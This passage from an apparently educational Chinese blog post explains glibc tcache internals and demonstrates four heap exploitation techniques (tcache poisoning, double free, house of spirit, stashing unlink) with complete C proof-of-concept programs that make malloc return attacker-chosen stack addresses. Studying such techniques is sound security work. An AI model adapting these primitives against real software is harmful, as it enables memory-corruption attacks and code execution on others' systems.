bit</li></ul></li><li>重新申请chunk，并且申请的size符合tcache的范围，则先从<strong>tcache中取chunk</strong>，直到tcache为空</li><li>tcache为空后，从bin中找</li><li>tcache为空时，如果fastbin、small bin、unsorted bin中有size符合的chunk，会先把fastbin、small bin、unsorted bin中的chunk放到tcache中，直到填满，之后再从tcache中取</li></ol><h2 id="3-源码分析"><a href="#3-源码分析" class="headerlink" title="3.源码分析"></a>3.源码分析</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  arena_get (ar_ptr, bytes); <span class="comment">// 找到可用的 arena</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn't enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim) <span class="comment">// 初始化 tcache</span></span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里初始化了tcache</p><p>主要就是找arena和分配chunk</p></blockquote><h3 id="内存申请"><a href="#内存申请" class="headerlink" title="内存申请"></a>内存申请</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// 从 tcache list 中获取内存</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>首先是在tcache中有chunk的时候，if判断要取出的chunk的size是否满足idx的合法范围，在tcache-&gt;entries不为空时调用<code>tcache_get()</code>函数获取chunk。</p></blockquote><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];<span class="comment">//获取指针</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);<span class="comment">//检查</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;<span class="comment">//替换下一个指针</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); </span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>从<code>tcache-&gt;entries[tc_idx]</code>获取一个chunk指针，并且<code>tcache-&gt;counts</code>减一，没有过多的安全检查或者保护</p></blockquote><h3 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure><blockquote><p>可以看到首先判断<code>tc_idx</code>的合法性，判断<code>tcache-&gt;counts[tc_idx]</code>在7个以内时，进入<code>tcache_put()</code>函数，传递的一参为要释放的chunk指针，二参为chunk对应的size在tcache中的下标</p></blockquote><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//释放的chunk</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//判断下标是否符合</span></span><br><span class="line">  <span class="comment">//链表的替换</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  <span class="comment">//数量增加</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>tcache_put()函数执行过程中把释放的chunk插入到了tcache-&gt;entries[tc_idx]链表的头部，整个插入的过程中也没有做任何的安全检查及保护，也没有将P标志位变为0</p></blockquote><p>其实我们也发现了，重点攻击的地方应该就是<code>tcache_get</code>和<code>tcache_put</code>两个地方。</p><h1 id="0x02-PWN-tcache"><a href="#0x02-PWN-tcache" class="headerlink" title="0x02 PWN tcache"></a>0x02 PWN tcache</h1><h2 id="1-tcache-poisoning"><a href="#1-tcache-poisoning" class="headerlink" title="1.tcache poisoning"></a>1.tcache poisoning</h2><p>tcache poisoning主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址。</p><p><img src="/2021/03/08/tcache/image-20210314162103060.png" alt="image-20210314162103060"></p><p>此时如果把图中fd值改为我们想要的值，那么攻击就成功了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// disable buffering</span></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The address we want malloc() to return is %p.\n"</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Freeing the buffers...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p -&gt; %p ].\n"</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p ].\n"</span>, &amp;stack_var);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2nd malloc(128): %p\n"</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We got the control\n"</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>sleep()为断点</p></blockquote><p>先看第一个断点下</p><p><img src="/2021/03/08/tcache/image-20210314165503011.png" alt="image-20210314165503011"></p><p>第二个断点</p><p><img src="/2021/03/08/tcache/image-20210314165645714.png" alt="image-20210314165645714"></p><p>很明显，当我们再次分配时，那么就会分配走我们想要的地址。</p><h2 id="2-tcache-dup"><a href="#2-tcache-dup" class="headerlink" title="2.tcache dup"></a>2.tcache dup</h2><p>上面的是针对malloc，这个针对的是free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple double-free attack with tcache.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating buffer.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Freeing twice...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p ].\n"</span>, a, a);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Next allocated buffers will be same: [ %p, %p ].\n"</span>, b, c);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接看第一次断点</p><p><img src="/2021/03/08/tcache/image-20210314213639524.png" alt="image-20210314213639524"></p><p>两个是在一个位置，为什么会这样？</p><p>我们可以来看一下<code>tcache_put</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//释放的chunk</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//判断下标是否符合</span></span><br><span class="line">  <span class="comment">//链表的替换</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  <span class="comment">//数量增加</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里知识简单的链表插入，它并没有进行判断。</p><p>之后直接进行申请，我们就可以拿到同一块地址的两个指针。</p><h2 id="3-tcache-house-of-spirit"><a href="#3-tcache-house-of-spirit" class="headerlink" title="3.tcache house of spirit"></a>3.tcache house of spirit</h2><p>tcache house of spirit这种利用方式是由于tcache_put()函数检查不严格造成的，在释放的时候没有检查被释放的指针是否真的是堆块的malloc指针，<strong>如果我们构造一个size符合tcache bin size的fake_chunk</strong>，那么理论上讲其实可以将任意地址作为chunk进行释放。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This region contains one fake chunk. It's size field is placed at %p\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(0x30): %p\n"</span>, b);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是比较好理解的。</p><p>我们来看一下第一次断点。</p><p><img src="/2021/03/08/tcache/image-20210314215452014.png" alt="image-20210314215452014"></p><p>第一次只有<code>tcache_perthread_struct</code>和我们申请的堆块</p><p>看第二次断点</p><p><img src="/2021/03/08/tcache/image-20210314215557280.png" alt="image-20210314215557280"></p><p>bins中出现了栈上的地址，这时我们分配一下，就可以拿到栈上的指针了。</p><p><img src="/2021/03/08/tcache/image-20210314215657530.png" alt="image-20210314215657530"></p><p>栈上的指针到手。</p><h2 id="4-tcache-stashing-unlink-attack"><a href="#4-tcache-stashing-unlink-attack" class="headerlink" title="4.tcache stashing unlink attack"></a>4.tcache stashing unlink attack</h2><p>首先从名字就可以看出这种方法与unlink有关，这种攻击利用的是tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中，这种情况可以使用calloc分配同大小堆块触发，因为calloc分配堆块时不从tcache bin中选取。在获取到一个smallbin中的一个chunk后，如果tcache任由足够空闲位置，会将剩余的smallbin挂进tcache中，在这个过程中只对第一个bin进行了完整性检查，后面的堆块的检查缺失。当攻击者可以修改一个small bin的bk时，就可以实现在任意地址上写一个libc地址。构造得当的情况下也可以分配fake_chunk到任意地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack_var addr is:%p\n"</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"chunk_lis addr is:%p\n"</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"target addr is:%p\n"</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You can see the value of fake_chunk-&gt;bk is:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Also, let's see the initial value of stack_var[4]:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we alloc 9 chunks with malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n"</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"As you can see, next malloc(0x90) will return the region our fake chunk: %p\n"</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体来看一下这个过程，先看这三个地址。</p><p><img src="/2021/03/08/tcache/image-20210318152451146.png" alt="image-20210318152451146"></p><p>先c一下，6个放入tcache</p><p><img src="/2021/03/08/tcache/image-20210318153644695.png" alt="image-20210318153644695"></p><p>再c，观察bins结构</p><p><img src="/2021/03/08/tcache/image-20210318153928275.png" alt="image-20210318153928275"></p><p>c两下，可以看到两个tcache已经分配了</p><p><img src="/2021/03/08/tcache/image-20210318154115014.png" 